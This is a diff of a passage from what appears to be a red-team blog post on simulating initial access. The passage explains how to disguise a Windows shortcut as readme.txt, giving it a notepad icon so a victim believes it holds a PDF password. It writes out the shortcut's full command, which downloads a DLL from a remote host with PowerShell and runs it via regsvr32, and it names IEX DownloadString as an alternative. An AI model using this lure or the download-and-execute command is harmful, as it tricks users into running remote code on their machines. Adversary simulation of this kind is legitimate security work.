@@ -61,21 +61,21 @@ Firt of all we need to create a shortcut file that will be delivered with the en
 </p>
 
 
-After that we can specify readme.txt as a shortcut name. (remember we want the user to click on the shortcut file thinking it is a text file with the password inside). Since we don't want to show the typical cmd.exe icon we can then add a specific icon that in this case will be notepad. Now we need to click on the shortcut properties and changhe the icon to match to notepad.txt (default windows text editor). 
+After that we can specify readme.txt as a shortcut name. (remember we want the user to click on the shortcut file thinking it is a text file with the password to decrypt the PDF). Since we don't want to show the typical `cmd.exe` icon, which might look suspicious, we can then add a specific icon that in this specific case will be notepad. Now we need to click on the shortcut properties and changhe the icon to match to notepad.txt (default windows text editor). 
 
 
 <p align="center">
   <img src="/assets/posts/2022-06-01-Initial-Access-Simulation/lnk2.PNG">
 </p>
 
-Now we can add the powershell command to download the DLL from a remote location. This must be specified inside the shortcut target menu interface. Then we can specify the output where to save the `.dll` file. For this we will leverage the `%TMP%` environment variable of Windows so we don't even need to know the local user accoun name and path. 
+Now we can craft the powershell command to download the DLL from a remote location. This must be specified inside the shortcut target menu interface. Then we can specify the output where to save the `.dll` file. For this we will leverage the `%TMP%` environment variable of Windows so we don't even need to know the local user accoun name and path. 
 
 The full command specified inside the shortcut file is the following: 
 
 ```powershell 
 C:\Windows\System32\cmd.exe /c powershell.exe wget http://192.168.133.152:1234/h.dll -OutFile %TMP%\h.dll && regsvr32 %TMP%\h.dll 
 ```
-__Note:__ The powershell download can be performed with the usual suspect IEX Download String function. 🚩
+__Note:__ The powershell download can be also be performed with the usual suspect IEX Download String function. 🚩
 
 Futhermore, the above command is included inside the readme.lnk file which will look like this to the end user. 
 
